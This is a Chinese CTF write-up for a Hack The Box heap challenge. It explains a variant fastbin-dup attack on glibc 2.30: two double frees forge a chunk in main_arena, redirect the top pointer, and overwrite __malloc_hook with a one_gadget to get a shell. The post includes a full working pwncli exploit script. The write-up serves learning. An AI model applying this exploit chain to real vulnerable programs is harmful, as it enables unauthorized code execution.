# fastbin dup 一个变种打法的分析与思考-先知社区

> **来源**: https://xz.aliyun.com/news/16967  
> **文章ID**: 16967

---

## 前言

该题目是一个 HTB Challenge - Medium 难度的练习，属于中等偏难了

一个堆题，libc 2.30 下的fastbin dup，且禁止申请0x70字节的chunk，常规的fastbin dup无法使用

在此约束下衍生出一个变种的fastbin dup打法：两轮fastbin dup控制top指针，绕过2.29安全检查控制malloc hook

**本文分享该变种打法的思考分析全流程**

## 题目情况

保护全开，libc版本是2.30

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    Stripped:   No
```

## 逆向分析

执行：

```
challenge ➤ ./da
Cast a magic spell to enhance your army's power: 123

Unknown spell!

Dragons: [0/13]

🀄🀄🀄🀄🀄🀄🀄🀄🀄
🀄              🀄
🀄  1. Summon   🀄
🀄              🀄
🀄  2. Release  🀄
🀄              🀄
🀄  3. Leave    🀄
🀄              🀄
🀄🀄🀄🀄🀄🀄🀄🀄🀄

>>
```

main函数太长了，分段来看

### 输入密码环节

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  __int64 opt; // rax
  size_t idx; // [rsp+0h] [rbp-C0h] BYREF
  __int64 v6; // [rsp+8h] [rbp-B8h]
  __int64 v7; // [rsp+10h] [rbp-B0h]
  void *buf; // [rsp+18h] [rbp-A8h]
  size_t num; // [rsp+20h] [rbp-A0h]
  char *ptr; // [rsp+28h] [rbp-98h]
  char *arr[13]; // [rsp+30h] [rbp-90h] BYREF
  unsigned __int64 v12[5]; // [rsp+98h] [rbp-28h] BYREF

  v12[0] = __readfsqword(0x28u);
  memset(arr, 0, sizeof(arr));
  idx = 0LL;
  v6 = 128LL;
  cls(v12, argv, arr);
  fwrite("Cast a magic spell to enhance your army's power: ", 1uLL, 0x31uLL, _bss_start);
  v7 = 127LL;
  v3 = alloca(128LL);
  buf = &idx;
  fflush(stdin);
  fflush(_bss_start);
  read(0, buf, v6 - 1);
  fflush(stdin);
  fflush(_bss_start);
  if ( !strncmp((const char *)buf, "r3dDr4g3nst1str0f1", 0x12uLL) )
    fprintf(_bss_start, "
Army's power has been buffed with spell: %s
", (const char *)buf);
  else
    fprintf(_bss_start, "
Unknown spell!
");
```

刚开始会让我们输入一个短语，答对答错不影响后续执行，但是答对了会打印输入的缓冲区，也就是这个短语

### 菜单选项1：申请内存

```
    if ( idx > 0xC )                            // opt1
    {
      fprintf(_bss_start, "
%s[-] No more summons!

%s", "\x1B[1;31m", "\x1B[1;34m");
      exit(22);
    }
    fwrite("
Dragon's length: ", 1uLL, 0x12uLL, _bss_start);
    fflush(stdin);
    fflush(_bss_start);
    num = read_num();
    fflush(stdin);
    fflush(_bss_start);
    if ( (num > 0x58 || num <= 1) && (num <= 0x68 || num > 0x78) )// size有限制，允许：
                                                // 2~0x58
                                                // 0x69~0x78
                                                // 
    {
      fprintf(_bss_start, "
%s[-] Invalid dragon length!%s
", "\x1B[1;31m", "\x1B[1;34m");
    }
    else
    {
      ptr = (char *)malloc(num);                // 0x70的 chunk 不能出现，最大0x80
      arr[idx] = ptr;
      if ( arr[idx] )
      {
        fflush(stdin);
        fflush(_bss_start);
        fwrite("
Name your dragon: ", 1uLL, 0x13uLL, _bss_start);
        fflush(stdin);
        fflush(_bss_start);
        fgets(arr[idx], num, stdin);            // fgets输入
        fflush(stdin);
        fflush(_bss_start);
        ++idx;
      }
      else
      {
        fprintf(_bss_start, "
%s[-] Something went wrong!%s

", "\x1B[1;31m", "\x1B[1;34m");
      }
    }
```

这里申请内存有限制，只能申请小于0x80的chunk，且不能是0x70的chunk

申请完内存后可以向内存写入数据

### 菜单选项2：释放内存

```
fwrite("
Dragon of choice: ", 1uLL, 0x13uLL, _bss_start);// opt2
      fflush(stdin);
      fflush(_bss_start);
      num = read_num();
      if ( num >= idx )
      {
        fprintf(_bss_start, "
%s[-] Unavailable dragon!%s
", "\x1B[1;31m", "\x1B[1;34m");
      }
      else
      {
        free(arr[num]);                         // 释放后没有清空指针
        fprintf(_bss_start, "
%s[+] The dragon flies away!
%s", "\x1B[1;32m", "\x1B[1;34m");
      }
```

输入索引，释放后没有清空指针

## 利用分析

### libc address leak

进入菜单选项前，输入短语这里：

```
  v6 = 128LL;
  read(0, buf, v6 - 1);
  if ( !strncmp((const char *)buf, "r3dDr4g3nst1str0f1", 0x12uLL) )
    fprintf(_bss_start, "
Army's power has been buffed with spell: %s
", (const char *)buf);
```

通过strncmp校验，所以意味着可以输入很长的内容，然后都会打印出来

而这里的buf是未初始化的缓冲区，刚好存在残留的地址，这里可以进行地址泄露：

```
# leak libc address
sla(b"Cast a magic spell to enhance your army's power: ", b"r3dDr4g3nst1str0f1" + b"a"*29)

ru(b"r3dDr4g3nst1str0f1" + b"a"*29 + b"
")
leak = rl()[:-1]
leak = u64(leak.ljust(8, b"\x00"))
success(f"leak addr: {hex(leak)}")
libc.address = leak -0x3b1420 
success(f"libc base addr: {hex(libc.address)}")
```

接下来进入菜单流程了，该分析一下当前情况了

### 当前情况分析

有 libc 地址泄露

经测试（申请一个chunk释放了看内存），程序无tcache，只能用fastbin

libc版本2.30，存在 hook 可以打

程序无溢出，存在 double-free 缺陷

不难想到经典的 fastbin dup 打 malloc hook 的手法，但是那需要能够申请 0x70 大小的chunk才行，这里禁了这一点

在当前这些约束下，似乎也只能通过fastbin dup来打，但是得变种一下才行，先回顾一下常规的流程

### fastbin dup 常规流程

1. 首先绕过double-free检查完成fouble-free（申请相同大小的chunkA，chunkB，按照顺序A，B，A释放即可绕过）

1. fastbin 的 double-free 检查只检查释放的chunk和链表第一个chunk是不是相同的

2. 拿到重叠chunk，此时可以控制fd指针
3. 寻找fake chunk作为fastbin chunk，让fd指针指向其
4. 申请走fake chunk，让fake chunk转正，从而在fake chunk的地方可以写入数据

1. 一般是用0x70申请走malloc hook附近的 fake chunk，来控制malloc hook劫持控制流

### fastbin dup 变种思考

这里梳理的流程中，从后往前看，可以变的地方：

1. fake chunk是我们自己找的，fake chunk可以不是malloc hook附近的那一个
2. 控制 fastbin chunk 的 fd 指针会对 main arena 产生影响，因为fastbin链表头节点位于arena结构中

对于arena的结构：

```
pwndbg> ptype main_arena
type = struct malloc_state {
    __libc_lock_t mutex;
    int flags;
    int have_fastchunks;
    mfastbinptr fastbinsY[10];
    mchunkptr top;
    mchunkptr last_remainder;
    mchunkptr bins[254];
    unsigned int binmap[4];
    struct malloc_state *next;
    struct malloc_state *next_free;
    size_t attached_threads;
    size_t system_mem;
    size_t max_system_mem;
}
```

fastbins 头节点指针数组位于很靠前的地方，然后挨着的是top chunk的指针

结合这几点，就有一个思路：首先通过第一次fastbin dup来创造一个fake fastbin chunk header在arena中：

```
# fastbin dup
add(0x48,b"0")
add(0x48,b"1")

free(0)
free(1)
free(0)

# create fake fast chunk header
add(0x48,pack(0x61))
add(0x48,pack(0x61))
add(0x48,pack(0x61))
```

此时的 arena：

```
pwndbg> x/14xg &main_arena
0x7f7b9146db60 <main_arena>:    0x0000000000000000      0x0000000000000001
0x7f7b9146db70 <main_arena+16>: 0x0000000000000000      0x0000000000000000
0x7f7b9146db80 <main_arena+32>: 0x0000000000000000      0x0000000000000061  <-- fake chunk header
0x7f7b9146db90 <main_arena+48>: 0x0000000000000000      0x0000000000000000
0x7f7b9146dba0 <main_arena+64>: 0x0000000000000000      0x0000000000000000
0x7f7b9146dbb0 <main_arena+80>: 0x0000000000000000      0x0000000000000000
0x7f7b9146dbc0 <main_arena+96>: 0x0000562a45d2a4c0      0x0000000000000000  <-- top chunk pointer
```

这里伪造fake chunk的查找结果：

```
pwndbg> find_fake_fast 0x7f7b9146dbc0
Searching for fastbin size fields up to 0x80, starting at 0x7f7b9146db48 resulting in an overlap of 0x7f7b9146dbc0
FAKE CHUNKS
Fake chunk | PREV_INUSE
Addr: 0x7f7b9146db80
prev_size: 0x00
size: 0x60 (with flag bits: 0x61)
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
```

然后进行第二次fastbin dup，申请走这个内存覆盖top指针：

```
# fastbin dup again
add(0x58,b"5")
add(0x58,b"6")

free(5)
free(6)
free(5)

fake_chunk_addr = libc.sym.main_arena + 0x20
add(0x58,pack(fake_chunk_addr))
add(0x58,pack(fake_chunk_addr))
add(0x58,pack(fake_chunk_addr))
add(0x58,pack(0)*6 +pack(libc.sym.__malloc_hook-0x24))
```

这里top指针指向的位置为什么不是malloc hook上面呢，这和2.29新增的一个安全检查有关

### top chunk ptr 安全检查（libc 2.29 新增）

这里libc 2.29新增了一个安全检查：

```
    use_top:
      /*
         If large enough, split off the chunk bordering the end of memory
         (held in av->top). Note that this is in accord with the best-fit
         search rule.  In effect, av->top is treated as larger (and thus
         less well fitting) than any other available chunk since it can
         be extended to be as large as necessary (up to system
         limitations).

         We require that av->top always exists (i.e., has size >=
         MINSIZE) after initialization, so if it would otherwise be
         exhausted by current request, it is replenished. (The main
         reason for ensuring it exists is that we may need MINSIZE space
         to put in fenceposts in sysmalloc.)
       */

      victim = av->top;
      size = chunksize (victim);

      if (__glibc_unlikely (size > av->system_mem))
        malloc_printerr ("malloc(): corrupted top size");
```

如果top chunk的size超过系统内存，就会报错`corrupted top size`

所以这里调整top chunk指针，使其指向一个size位置大小小于系统内存的地方，也就是这里的`-0x24`的位置，就可以正常使用top chunk了

### one\_gadget drop shell

最后就是one\_gadget去拿shell了：

```
# one gadgets
"""
ibc/libc.so.6
0xc4dbf execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL || r13 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4ddf execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4de6 execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rax == NULL || {rax, rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

"""
add(0x78,b"aaaa" +b"\x00"*0x10 +pack(libc.address + 0xe1fa1))

add(0x18,b"cat flag.txt")
```

## 完整exp

```
#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def cmd(i, prompt=b">> "):
    sla(prompt, i)

def add(size:int, content:bytes):
    cmd('1')
    sla(b"length: ",str(size).encode())
    sla(b"dragon: ",content)
    #......

def free(idx:int):
    cmd('2')
    sla(b"choice: ",str(idx).encode())
    #......

def leave():
    cmd('3')
    #......


# leak libc address
sla(b"Cast a magic spell to enhance your army's power: ", b"r3dDr4g3nst1str0f1" + b"a"*29)

ru(b"r3dDr4g3nst1str0f1" + b"a"*29 + b"
")
leak = rl()[:-1]
leak = u64(leak.ljust(8, b"\x00"))
success(f"leak addr: {hex(leak)}")
libc.address = leak -0x3b1420 
success(f"libc base addr: {hex(libc.address)}")

# fastbin dup
add(0x48,b"0")
add(0x48,b"1")

free(0)
free(1)
free(0)

# create fake fast chunk header
add(0x48,pack(0x61))
add(0x48,pack(0x61))
add(0x48,pack(0x61))

"""
pwndbg> x/14xg &main_arena
0x7f7b9146db60 <main_arena>:    0x0000000000000000      0x0000000000000001
0x7f7b9146db70 <main_arena+16>: 0x0000000000000000      0x0000000000000000
0x7f7b9146db80 <main_arena+32>: 0x0000000000000000      0x0000000000000061  <-- fake chunk header
0x7f7b9146db90 <main_arena+48>: 0x0000000000000000      0x0000000000000000
0x7f7b9146dba0 <main_arena+64>: 0x0000000000000000      0x0000000000000000
0x7f7b9146dbb0 <main_arena+80>: 0x0000000000000000      0x0000000000000000
0x7f7b9146dbc0 <main_arena+96>: 0x0000562a45d2a4c0      0x0000000000000000  <-- top chunk pointer

pwndbg> find_fake_fast 0x7f7b9146dbc0
Searching for fastbin size fields up to 0x80, starting at 0x7f7b9146db48 resulting in an overlap of 0x7f7b9146dbc0
FAKE CHUNKS
Fake chunk | PREV_INUSE
Addr: 0x7f7b9146db80
prev_size: 0x00
size: 0x60 (with flag bits: 0x61)
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
"""

# fastbin dup again
add(0x58,b"5")
add(0x58,b"6")

free(5)
free(6)
free(5)

fake_chunk_addr = libc.sym.main_arena + 0x20
add(0x58,pack(fake_chunk_addr))
add(0x58,pack(fake_chunk_addr))
add(0x58,pack(fake_chunk_addr))
add(0x58,pack(0)*6 +pack(libc.sym.__malloc_hook-0x24))


# one gadgets
"""
ibc/libc.so.6
0xc4dbf execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL || r13 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4ddf execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4de6 execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rax == NULL || {rax, rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

"""
add(0x78,b"aaaa" +b"\x00"*0x10 +pack(libc.address + 0xe1fa1))

add(0x18,b"cat flag.txt")

ia()
```

## 总结

fastbin dup 打 hook 的第二条思路，get！

常规fastbin dup：利用malloc hook上面地址的0x7f作为fake chunk来申请，通过写malloc hook劫持控制流

变种fastbin dup：利用fastbin dup在arena中创造fake chunk，通过fake chunk操纵top chunk指针，通过top chunk申请内存来申请走 malloc hook 所在地址，通过写malloc hook劫持控制流

## 参考资料

* libc malloc.c 源码
* [Hack The Box :: Hack The Box](https://app.hackthebox.com/challenges/Dragon%20Army)
